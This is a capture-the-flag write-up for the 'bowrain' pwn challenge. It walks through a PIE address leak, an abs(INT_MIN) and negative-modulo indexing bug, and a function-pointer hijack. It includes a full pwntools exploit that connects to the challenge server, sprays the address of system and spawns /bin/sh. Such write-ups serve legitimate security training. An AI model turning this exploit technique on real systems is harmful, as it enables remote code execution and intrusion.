**Description**

> A little known fact about Elon Musk is that he invented the matrix as a
> scheme to sell trendy late 90s screensavers to fund his space adventures.
> That sneaky SOB left his beta screensaver app online and I think it has a
> backdoor.  
>  
> Service: nc pwn2.trinity.neo.ctf.rocks 54321 | nc 159.65.80.92 54321

**Files given**

- `bowrain.tar.gz`

**Solution**

### Problems ###

1. no null termination in function `sub_CB0`, which is used to get a string, so PIE base address can be leaked.  
2. `abs(INT_MIN)` is still a negative number  
3. `x % n` is negative when x is negative

in function `main`

```c  
while ( 1 )  
 {  
   v4[0] = get_number();  
   if ( v4[0] == -1 )  
   {  
     printf("\x1B[31;1merror:\x1B[0m not a number: %s\n", ::a1, *(_QWORD *)v4, v5);  
       // leak PIE possible  
   }  
   else  
   {  
     v4[1] = abs(v4[0]) % 7;//can be negative if v4[0] is 2147483648  
     memset(::a1, 0, endptr - (char *)::a1);  
     v3 = (void (__fastcall *)(char *, _QWORD))*(&off_2030A0 + v4[1]);  
     //will access a function pointer that can be manipulated by input if negative  
     v3(++endptr, 0LL);  
     //++endptr will point to the address just after the null terminator of input  
   }  
   print_choice();  
```

and in `.data`

```assembly  
.data:0000000000203020 a1              db 30h, 7Fh dup(0)  
.data:00000000002030A0 off_2030A0      dq offset sub_AE0  
.data:00000000002030A8                 dq offset sub_B1A  
.data:00000000002030B0                 dq offset sub_B54  
.data:00000000002030B8                 dq offset sub_B8E  
.data:00000000002030C0                 dq offset sub_BC8  
.data:00000000002030C8                 dq offset sub_C02  
.data:00000000002030D0                 dq offset sub_C3C  
```

buffer that holds the input is contiguous with the function pointers.

First of all, since there is no null termination, we can leak address of
`sub_AE0` to get base address.

Secondly, if the index to access the function pointer table is negative, we
can hijack the control flow to function `system`.

```python  
from pwn import *

g_local=False  
#context.log_level='debug'  
if g_local:  
	sh = process('./bowrain')#env={'LD_PRELOAD':'./libc.so.6'}  
	gdb.attach(sh)  
else:  
	sh = remote("159.65.80.92", 54321)

sh.send("A" * 0x80 + "\n")  
sh.recvuntil("A" * 0x80)  
leak = sh.recvuntil(": ")[:6] + "\x00\x00"  
base = u64(leak) - 0xAE0  
print hex(base)

payload = "2147483648" + "\x00" + "/bin/sh\x00"  
payload += "A" * 5  
assert len(payload) == 0x18  
payload += ((0x80 - len(payload)) / 8) * p64(base + 0x958)  
# spray the address of system,  
# so any access of function pointer table with negative index > -7 (by %
operation)  
# will give address of system  
# excact number can be determined by debugging, but spraying is more
convinient  
sh.send(payload + "\n")  
sh.interactive()  
```

Original writeup
(https://github.com/Aurel300/empirectf/blob/master/writeups/2018-05-31-SecurityFest/README.md#261-pwn
--bowrain).